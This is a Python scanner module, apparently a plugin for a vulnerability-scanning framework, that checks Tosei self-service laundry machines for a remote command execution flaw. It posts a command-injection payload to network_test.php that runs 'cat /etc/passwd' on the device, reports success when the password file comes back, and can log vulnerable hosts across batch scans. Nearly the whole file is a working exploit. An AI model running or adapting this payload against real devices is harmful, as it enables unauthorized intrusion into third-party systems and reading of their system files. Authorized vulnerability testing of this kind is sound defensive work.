#!/user/bin/env python3
# -*- coding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import re
class Tosei_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/cgi-bin/network_test.php'
        data = "host=%0acat${IFS}/etc/passwd%0a&command=ping"
        header = {
            "User-Agent":self.header,
            "Accept-Encoding": "gzip",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            req = requests.post(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=header,data=data)
            if "root:x" in req.text:
                OutPrintInfo("Tosei", f"存在日本tosei自助洗衣机RCE漏洞 {url2}")
                if self.batch:
                    with open("./result/tosei_rce.txt","a") as w:
                        w.write(f"{url2}\n")
                else:
                    OutPrintInfo("Tosei", f"Data: {data}")
                    OutPrintInfo("Tosei", f"响应: {req.text.strip()}")

                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Tosei", "不存在日本tosei自助洗衣机RCE漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Tosei", "开始检测日本tosei自助洗衣机RCE漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Tosei", "日本tosei自助洗衣机RCE漏洞检测结束")

